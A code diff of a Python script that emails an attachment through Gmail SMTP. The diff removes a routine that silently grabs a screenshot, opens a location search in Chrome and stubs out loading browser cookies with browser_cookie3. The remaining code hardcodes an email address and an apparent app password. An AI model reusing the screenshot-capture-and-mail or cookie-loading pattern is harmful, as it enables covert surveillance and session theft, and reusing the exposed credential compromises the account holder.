@@ -1,5 +1,4 @@
 import smtplib
-import time
 import ssl
 import os
 from email.message import EmailMessage
@@ -7,25 +6,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from email.message import EmailMessage
-from PIL import ImageGrab
 
-id_num = time.time()
-
-def take_screenshot(filename=f"screenshot{id_num}.png"):
-    img = ImageGrab.grab()
-    img.save(filename)
-    print(f"Screenshot saved as {filename}")
-if __name__ == "__main__":
-    take_screenshot()
-import os
-os.system("start chrome --new-window https://www.google.com/search?q=whats+my+current+location&rlz=1C1ONGR_enUS1185US1185&oq=whats+my+cur&gs_lcrp=EgZjaHJvbWUqBwgAEAAYgAQyBwgAEAAYgAQyBwgBEAAYgAQyBwgCEAAYgAQyCQgDEAAYChiABDIGCAQQRRg5MgkIBRAAGAoYgAQyBwgGEAAYgAQyCQgHEAAYChiABDIJCAgQABgKGIAEMgkICRAAGAoYgASoAgCwAgA&sourceid=chrome&ie=UTF-8&safe=active&ssui=on")
-#pyautogui.moveTo(1300, 750, duration = 1)
-#pyautogui.click()
-
-take_screenshot()
-
-
+# Email details
 email_sender = "douglas.london@ucas-edu.net"  # Replace with your email address
 email_receiver = "douglas.london@ucas-edu.net"  # Replace with the recipient's email address
 email_password = "fjlp luur itcn mcgz"  # Replace with generated app password
@@ -39,30 +21,38 @@ msg['To'] = email_receiver
 
 msg.attach(MIMEText(body, 'plain'))
 
-filename = f"screenshot{id_num}.png"
+filename = "screenshot.png"  # If want to send image then file path here
 
+# Open the file in binary read mode
 try:
     with open(filename, "rb") as attachment:
-
+        # Add file as application/octet-stream
+        # Email client can usually download this automatically
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())
 
+    # Encode file in ASCII characters to send by email
     encoders.encode_base64(part)
+
+    # Add header as key/value pair to attach part
     part.add_header(
         "Content-Disposition",
         f"attachment; filename= {filename}",
     )
 
+    # Attach the file to the email
     msg.attach(part)
 
 except FileNotFoundError:
     print(f"Error: {filename} not found.")
     exit()
 
+# SMTP server details
 smtp_server = "smtp.gmail.com"
 port = 465
 context = ssl.create_default_context()
 
+# Send the email
 try:
     with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
         server.login(email_sender, email_password)
@@ -70,16 +60,3 @@ try:
     print("Email sent successfully!")
 except Exception as e:
     print(f"Error sending email: {e}")
-
-
-## Disclaimer: This requires the 'browser_cookie3' library installed 
-# and runs on your own machine for your own data.
-#import requests
-#import browser_cookie3
-
-# Load cookieks from the default browser (e.g., Chrome)
-#cj = browser_cookie3.chrome()
-
-# Use the loaded cookies in a request to a website you are logged into
-# This will use your existing browser session for the request
-#r = requests.get("
